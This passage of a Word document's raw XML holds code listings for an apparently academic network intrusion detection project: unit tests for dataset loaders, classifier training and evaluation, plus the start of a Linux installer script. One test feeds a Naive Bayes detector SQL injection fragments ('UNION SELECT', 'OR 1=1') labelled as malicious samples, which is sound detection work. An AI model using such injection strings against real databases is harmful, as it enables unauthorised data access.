      </w:r>
    </w:p>
    <w:p w14:paraId="7C4CB5E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 = _tmp_csv("foo,bar\n1,2\n")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25EA3F3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26892A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self.assertRaises(loader.DatasetError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="773ECF2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loader.load_knn_csv(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F9E0E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finally:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D8E889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os.unlink(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="501B6166" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45745DA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test_cic_destination_port_is_not_used_as_unique_port_count(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C3969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 = _tmp_csv(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="619A7F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"Tot Fwd Pkts,Dst Port,Label\n50,0,DDoS\n40,443,Benign\n")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F2B9CF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47327E9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self.assertRaisesRegex(loader.DatasetError,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="772F10E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"pre-aggregated.*unique_ports"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A7D0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loader.load_cic_iot2023(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3803DC6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finally:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="072AADB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os.unlink(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B57009A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23BED37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test_cic_only_labels_scan_families_as_scan(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AC417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 = _tmp_csv(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FB6751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"packet_count,unique_ports,label\n"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15B5F15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"1000,20,DDoS\n40,30,Recon-PortScan\n80,12,Benign\n")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FF9045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0F28D7C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rows = loader.load_cic_iot2023(p)["knn"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CEB84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self.assertEqual([row[2] for row in rows],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6248EE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["Normal", "Scan", "Normal"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E2AC2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finally:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CF3AFD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os.unlink(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BAE5446" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49E3FB0A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A2280E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TestTrain(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B808B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test_knn_keeps_rows(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="373241E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rows = [[2, 8, "Normal"], [3, 12, "Normal"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E17C97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[50, 60, "Scan"], [100, 200, "Scan"]]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1199703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 = train.train_knn(rows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4672C3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self.assertEqual(b["k"], 3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BC1DC7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self.assertEqual(len(b["training_data"]), 4)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17337D1A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D5306F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test_naive_bayes_priors_sum_to_one(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="653E23B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rows = [("GET /", "Normal"), ("GET /home", "Normal"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BEE01D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("UNION SELECT", "Malicious"), ("OR 1=1", "Malicious")]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14C9A2C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 = train.train_naive_bayes(rows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1677321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self.assertAlmostEqual(b["prior_malicious"] + b["prior_safe"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75C98F3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1.0, places=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="508842A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self.assertIn("UNION", b["likelihoods"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16716B9E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="183A3E4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test_kmeans_returns_k_centroids(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D74E8C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pts = [[10, 2], [12, 3], [200, 5], [250, 6], [20, 50], [25, 60]]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5912640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 = train.train_kmeans(pts, k=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3194E6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self.assertEqual(b["k"], 3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3863E9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self.assertEqual(len(b["centroids"]), 3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C0E1A58" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="741581E0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78245B6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class TestEvaluate(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25D3169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test_knn_metrics(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E179F0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 = _tmp_csv(KNN_CSV)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B3C1A5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2BCB7D2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 = evaluate.evaluate_knn(loader.load_knn_csv(p), brain={})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="388D438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self.assertGreaterEqual(r["accuracy"], 0.8)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E6507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self.assertEqual(r["engine"], "KNN (Port Scan)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24DB024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finally:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F3D05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os.unlink(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="248C4BF6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="354AD23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test_payload_metrics_have_keys(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12706A8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 = _tmp_csv(PAYLOAD_CSV)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DB2AE1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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ACE8F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 = evaluate.evaluate_payload(loader.load_payload_csv(p),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7164E9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brain={})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="474BF00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k in ("precision", "recall", "f1", "accuracy",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47452C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"confusion_matrix"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43C99F3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self.assertIn(k, r)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28EDE3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finally:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="494F2C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os.unlink(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D5EDC6A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B3ACA7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def test_brain_round_trip(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5975154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brain = {"knn": train.train_knn([[2, 8, "Normal"], [50, 60, "Scan"]]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BBF63B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"_meta": {"trained_at": "test"}}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78626D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with tempfile.TemporaryDirectory() as d:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="730AF7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out = os.path.join(d, "mantis_brain.json")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06CEA4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written = train.write_brain(out, brain)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="408A1ED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self.assertTrue(os.path.isfile(written))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DCEE5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xml:space="preserve">            with open(written) as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="555A15B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self.assertIn("knn", json.load(f))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C000284" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="276D7784" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D8EDCA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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB369A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unittest.main(verbosity=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E9F37A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F2E8329" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Installation and Demonstration Scripts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="466A8EB1"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src/install.sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F0EB21" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>134 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="357907C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#!/bin/bash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F2B953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mantis installer - works on most linux distros</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="460827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set -e</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F1DF36" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="770CE2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 "$EUID" -ne 0 ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="444ABD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echo "[!] run as root: sudo ./install.sh"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0262869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exit 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18D288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fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FBB41B4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DD4907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detect distro</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EB6617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DISTRO="unknown"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45C717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PKG=""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D13BF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INSTALL=""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52F56C8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 -f /etc/os-release ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C51916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/etc/os-release</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5043C7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DISTRO=$ID</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="534684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fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53551B07" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02FACC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case "$DISTRO" in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A771A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ubuntu|debian|kali|raspbian|linuxmint|pop|elementary)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76520F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PKG="apt-get"; INSTALL="apt-get install -y --no-install-recommends" ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="452CAB2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fedora|rhel|centos|rocky|almalinux)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DAF0A4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command -v dnf &gt;/dev/null 2&gt;&amp;1; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F2928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PKG="dnf"; INSTALL="dnf install -y"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="090725E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else</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72463B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PKG="yum"; INSTALL="yum install -y"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B677D3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fi ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C3C987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arch|manjaro|endeavouros)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BB167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PKG="pacman"; INSTALL="pacman -S --noconfirm --needed" ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FD56BB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opensuse*|sles)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7992046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PKG="zypper"; INSTALL="zypper install -y" ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71C0A53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alpine)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="068FCE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PKG="apk"; INSTALL="apk add --no-cache" ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55EB5D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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4160BB6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echo "[!] unknown distro '$DISTRO' - continuing with generic install" ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3702B8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esac</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E5CF104" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E971C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distro: $DISTRO  pkg: ${PKG:-none}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16205EE3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72E4E5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python check</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5256CA6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 command -v python3 &gt;/dev/null 2&gt;&amp;1; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="669EFE7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echo "[!] python3 missing, trying to install..."</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C953E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case "$PKG" in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0499E5D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apt-get|dnf|yum|zypper|apk) $INSTALL python3 ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F12B06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pacman) $INSTALL python ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B058C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echo "[!] install python3 manually"; exit 1 ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EEDB4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esac</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="503BCDB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fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="214FC684" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C7F720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PY_OK=$(python3 -c 'import sys; print(1 if sys.version_info &gt;= (3,6) else 0)')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="104703C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 "$PY_OK" != "1" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F681BA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echo "[!] need python 3.6+"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27FA421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exit 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46C562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fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D716615" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="226605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optional but useful tools</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF7739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case "$PKG" in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="361A1D5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apt-get) $INSTALL iptables libcap2-bin || true ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E4FA1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dnf|yum) $INSTALL iptables libcap || true ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4559EE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pacman)  $INSTALL iptables libcap || true ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2625A1B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zypper)  $INSTALL iptables libcap-progs || true ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CBA890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apk)     $INSTALL iptables libcap || true ;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B28BD2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esac</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14EE07B8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AAAE34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warn if AF_PACKET not available (kernel/container case)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58DEE96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HAS_AF=$(python3 -c 'import socket; print(1 if hasattr(socket,"AF_PACKET") else 0)' 2&gt;/dev/null || echo 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AADB6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 "$HAS_AF" != "1" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752C92D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echo "[!] AF_PACKET not available - sensor mode won't work but train/eval will"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A0B193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fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26D2AF8B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BA51E3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INSTALL_DIR="/opt/mantis"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08842E9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BIN_DIR="/usr/local/bin"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51FB58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SUDO_BIN_DIR="/usr/bin"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3288A30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SOURCE_DIR=$(pwd)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE419BE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FBC56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 "$SOURCE_DIR" = "$INSTALL_DIR" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0757189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echo "[*] in-place install"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3356896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else</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E32C7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echo "[*] installing to $INSTALL_DIR"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B2E5D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rm -rf "$INSTALL_DIR"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CCA8F0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mkdir -p "$INSTALL_DIR"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01DDD97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cp -r ./* "$INSTALL_DIR/"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36EC362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fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE5FEB7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="786971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 CRLF -&gt; LF for windows-edited files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="003C85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command -v sed &gt;/dev/null 2&gt;&amp;1; then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CD56C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find "$INSTALL_DIR" -type f \( -name "*.py" -o -name "*.sh" -o -name "*.md" \) \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12A2B11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-exec sed -i 's/\r$//' {} \; 2&gt;/dev/null || true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0670ABE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fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B808482" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C6827C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chmod +x "$INSTALL_DIR/main.py" "$INSTALL_DIR/dashboard_ui/siem.py" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42CB9C4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"$INSTALL_DIR/sensor_node/sensor.py" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1836D0E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"$INSTALL_DIR/training/train.py" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09F996A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"$INSTALL_DIR/evaluation/evaluate.py" \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4715188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"$INSTALL_DIR/demo_all_attacks.sh" "$INSTALL_DIR/replay.py" 2&gt;/dev/null || true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F5AABB1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="247965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mkdir -p "$BIN_DIR"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="602706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ln -sf "$INSTALL_DIR/main.py" "$BIN_DIR/mantis"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="543B023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ln -sf "$INSTALL_DIR/dashboard_ui/siem.py" "$BIN_DIR/mantis-siem"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76CFD0B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ln -sf "$INSTALL_DIR/training/train.py" "$BIN_DIR/mantis-train" 2&gt;/dev/null || true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D87D2A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ln -sf "$INSTALL_DIR/evaluation/evaluate.py" "$BIN_DIR/mantis-eval" 2&gt;/dev/null || true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EAA25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ln -sf "$INSTALL_DIR/replay.py" "$BIN_DIR/mantis-replay" 2&gt;/dev/null || true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="607F5CE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ln -sf "$INSTALL_DIR/demo_all_attacks.sh" "$BIN_DIR/mantis-demo-attacks" 2&gt;/dev/null || true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="111B102A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5647C85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Some sudo configurations use a restricted PATH that omits /usr/local/bin.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ADE7EF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Keep compatibility links for the commands that need to run through sudo so</w:t>
      </w:r>
    </w:p>
